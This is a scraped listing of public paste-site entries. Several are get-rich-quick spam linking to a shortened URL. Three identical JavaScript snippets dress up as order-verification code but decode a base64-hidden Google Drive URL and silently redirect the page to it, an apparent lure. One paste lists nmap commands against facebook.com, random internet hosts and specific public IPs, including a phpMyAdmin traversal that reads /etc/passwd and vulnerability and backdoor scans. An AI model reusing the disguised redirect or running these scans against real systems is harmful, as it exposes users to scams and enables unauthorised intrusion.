id,title,username,language,date,content
mQUNNtrb,Make $1000 15-MINUTES  (BEGINNER) GM,ogkuki88,JavaScript,Tuesday 22nd of April 2025 01:03:46 PM CDT," 
Pdf https://tinyurl.com/privguidee


0gJeee9OSH
"
bvd7Bp5m,Market.js,dentira,JavaScript,Tuesday 22nd of April 2025 12:59:06 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/31560/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
FqtsxNwS,nmap commands Astranmap (ipmapping),RebelRose,Bash,Tuesday 22nd of April 2025 12:56:11 PM CDT,"Astranmap nmap builds commands ........
.................

sudo nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged

https://github.com/andrewjkerr/security-cheatsheets/blob/master/nmap

https://github.com/screetsec/Dracnmap/blob/master/dracnmap-v2.2.sh

https://github.com/paralax/ObsidianSailboat

https://github.com/phx/cvescan

pkg upgrade
pkg update
pkg install git
pkg install python
pkg install nmap
git clone https://github.com/mishakorzik/MyNmap
pip3 install requests
cd MyNmap
python nmap.py

https://null-byte.wonderhowto.com/how-to/hack-like-pro-advanced-nmap-for-reconnaissance-0151619/

https://github.com/Hellfire13666/d9scan

nmap -sS 192.168.89.191 -oN
nmap -sU --reason 192.168.89.191
192.168.89.191
nmap -sS 192.168.89.191 -oN portscan
nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged
nmap -p80 --script http-phpmyadmin-dir-traversal --script-args=""dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'"" 102.89.83.24

nmap -A -sVC 102.89.83.24 --script=vuln -vvv  --unprivileged
sudo nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged
nmap -sV -A facebook.com --script-trace --script=http-headers -v -iR 10000 -Pn -p 80 --unprivileged
nmap -p80 --script http-phpmyadmin-dir-traversal --script-args=""dir='/pma/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'"" 102.89.83.24
nmap -A -sVC 102.89.83.24 --script=vuln -vvv -Pn
nmap --script ftp-proftpd-backdoor -p 21
nmap -A -sVC 102.89.83.24 --script=vuln -vvv -Pn
nmap -sV --script http-coldfusion-subzero
nmap -A --badsum -r
Nmap -A -sVC 102.89.83.24 --script=vuln -vvv
Nmap -A -sVC 102.0.0.0 --script=vuln -vvv
nmap -A --badsum -r
nmap --script ftp-vsftpd-backdoor -p 21
nmap -A -r  144.91.111.50
144.91.111.50
nmap --unprivileged

cat portscan.txt


mkdir astranmap
cd astranmap
ls -a
nano astranmap 
chmod +x astranmap.sh
 ./astranmap.sh

"
TbuF0b1U,EARN $900 INSTANTLY 2025 2T,ogkuki88,JavaScript,Tuesday 22nd of April 2025 12:54:28 PM CDT," 
Pdf https://tinyurl.com/privguidee


3yIqkoEg1I
"
e0ggL7H0,Make $1000 15-MINUTES (BEGINNER) XU,ogkuki88,JavaScript,Tuesday 22nd of April 2025 12:45:10 PM CDT," 
Pdf https://tinyurl.com/privguidee


USnKdBJxhW
"
NZVDngpp,Untitled,dentira,JavaScript,Tuesday 22nd of April 2025 12:43:44 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79992/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BHnwqryi,map,Koong_Ding,JSON,Tuesday 22nd of April 2025 12:35:59 PM CDT,"Crime City.,
Outlaw Oasis.,
Shiny Shafts.,
Lonewolf Lair.,
Rett i Ett Svarte Markedet.,
Bak Demon Dojo Fjelle (duo).,
Whiffy Wharf.,
Flooded Frogs.,
Magic Mosses.,
Pumped Power.,
Demon.s Dojo.,
Brutal Boxcars.,
Foxy Floodgate.,
Seaport City.,
Shining Span.,
Shogun.s Solitude.,
Canyon Crossing.,
Masked Meadows.,
Hopeful Heights.,
Kappa Kappa Factory.,
Bak Canyon fjellet (duo).,
Yngste Personen Skal Velge.,"
b9Ue4vGm,EARN $900 INSTANTLY 2025 2T,afowlown15,JavaScript,Tuesday 22nd of April 2025 12:35:48 PM CDT," 
Pdf https://tinyurl.com/privguidee


PkDzQPueB7
"
epGQfQeW,First OneLine install,RebelRose,Bash,Tuesday 22nd of April 2025 12:32:17 PM CDT,"xpip install -U 'xonsh[full]'

in the xonsh shell type this

pip install xontrib-autojump

pkg install tcsh

pip install xonsh

pkg install beanshell

proot-distro login 

pkg install photon-rss

pkg install findomainn
 
pkg install whois 

 
pip install holehe

 
pip install arachnid-spider
 
pip install masto

 
pip install social-analyzer
 
pip install hashtray

 
pip install funny-words
 
pip3 install linkchecker
 
pip3 install r3con1z3r

 
pip install oxdork

 
apt install cmatrix

 
apt install crawl

 
pip3 install --upgrade netizenship

 
pip3 install -U search4

 
pip install scrapy

 
apt install exiftool


pip install MetaDetective

 
pip install linkook

 
apt install rustscan
 

pkg install photon-rss

 
npm install -g tunnelmole
 

pip install nexfil
  

pip install phoneintel
 

pip install dnstwist
 

pip install ignorant
 

pip3 install username_generator
 
apt install rustscan

 
pip install phoneintel

 
pip3 install TUIFIManager --upgrade
  

apt install lazygit

pkg install busybox

pkg install nodejs
pkg install nodejs-lts


pip install badurls


pip install socialscan


pkg install grep


 "
uBM0URct,Products.js,dentira,JavaScript,Tuesday 22nd of April 2025 12:28:20 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/76634/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
